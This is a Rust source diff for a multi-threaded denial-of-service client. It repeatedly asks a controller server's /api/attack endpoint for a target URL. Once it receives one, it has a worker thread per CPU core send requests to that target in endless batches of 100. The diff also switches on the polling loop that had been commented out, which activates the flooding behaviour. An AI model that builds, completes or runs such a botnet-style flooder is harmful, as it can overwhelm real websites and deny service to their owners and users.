@@ -2,22 +2,22 @@ use serde_json;
 use std::sync::{Arc, Condvar};
 use std::time;
 use dashmap::DashMap;
-use shared_mutex::SharedMutex;
+use shared_mutex::{SharedMutex, SharedMutexWriteGuard};
 
-struct Client<'a> {
+struct Client {
     host_address: String,
-    attack_data: Arc<(SharedMutex<(bool, &'a str)>, Condvar)>,
+    attack_data: Arc<(SharedMutex<String>, Condvar)>,
     results: Arc<DashMap<u32, Vec<String>>>,
 }
 
 //client methods
-impl Client<'_> {
+impl Client {
     //constructor
-    fn new<'a>(host: String) -> Client<'a> {
+    fn new<'a>(host: String) -> Client {
         let thread_count = std::thread::available_parallelism().unwrap().get();
         let mut cl = Client {
             host_address: host,
-            attack_data: Arc::new((SharedMutex::new((false, "")), Condvar::new())),
+            attack_data: Arc::new((SharedMutex::new(String::new()), Condvar::new())),
             results: Arc::new(DashMap::with_capacity(thread_count)),
         };
         for i in 0..thread_count {
@@ -27,23 +27,20 @@ impl Client<'_> {
     }
 
     //checks if the server can attack, if it can, it notifies the workers
-    fn can_attack(&self) {
-        // sends request to the server to check if it can attack
+    fn can_attack<'a>(&self) {
+
         let url = self.host_address.as_str();
-        //parses the result
         let req = reqwest::blocking::get(format!("{}/api/attack", url)).unwrap().json::<String>().unwrap().
             strip_prefix("{\"").unwrap().to_string().strip_suffix("\"}").unwrap().to_string();
-        let attack_address_url = req.split("\":\"").collect::<Vec<&str>>()[1];
-        let mut can_attack = !attack_address_url.is_empty();
-        let (lock, cv) = &*self.attack_data;
+        let mut attack_address_url = req.split("\":\"").collect::<Vec<&str>>()[1].to_string();
+        let url_str = attack_address_url.as_str().clone().to_owned();
+        let (lock, cv) = &*self.attack_data.clone();
         let mut wlock = lock.write().unwrap();
-        let (mut attacking, mut address) = &*wlock;
-        address = attack_address_url;
-        attacking = can_attack;
-        match attacking {
-            true => cv.notify_all(),
-            false => ()
-        };
+        *wlock = url_str;
+        drop (wlock);
+        if !attack_address_url.is_empty(){
+            cv.notify_all();
+        }
     }
 
     fn start_requesting(client: reqwest::blocking::Client, id: u32, address: &str, results: Arc<DashMap<u32, Vec<String>>>, ) {
@@ -61,26 +58,25 @@ impl Client<'_> {
         };
     }
 
-    fn thread_worker(attack_data: Arc<(SharedMutex<(bool, &str)>,  Condvar)>, results: Arc<DashMap<u32, Vec<String>>>, id: u32) {
+    fn thread_worker(attack_data: Arc<(SharedMutex<String>,  Condvar)>, results: Arc<DashMap<u32, Vec<String>>>, id: u32) {
         let client = reqwest::blocking::Client::new();
         let (lock, cv) = &*attack_data;
+        let delay = std::time::Duration::from_micros(15);
         //infinite loop todo make it stoppable by some signal
         loop {
+            std::thread::sleep(delay);
             let mut pair = lock.read().unwrap();
-            let (attacking, address) = &*pair;
+            let address = &*pair;
             let addr = address.clone().to_string().to_owned();
-            if !attacking {
+            if address.is_empty() {
                 pair = pair.wait_for_read(cv).unwrap();
             }
-            let mut _r = 0;
             for _ in 0..100 {
                 Client::start_requesting(client.clone(), id, addr.as_str(), results.clone());
             }
         }
     }
 }
-
-    //main function, starts the threads and the attack and collects info
     fn run() {
         let cl = Client::new(String::from("http://localhost:8080"));
         let attack_data = cl.attack_data.clone();
@@ -120,9 +116,9 @@ impl Client<'_> {
             }
         });
         //checks if the server can attack
-        // loop {
-        //     self.can_attack();
-        // }
+        loop {
+            cl.can_attack();
+        }
         //waits for the thread to finish todo make it finishable by some signal
         handl.join().unwrap();
         while worker_threads.len() > 0 {
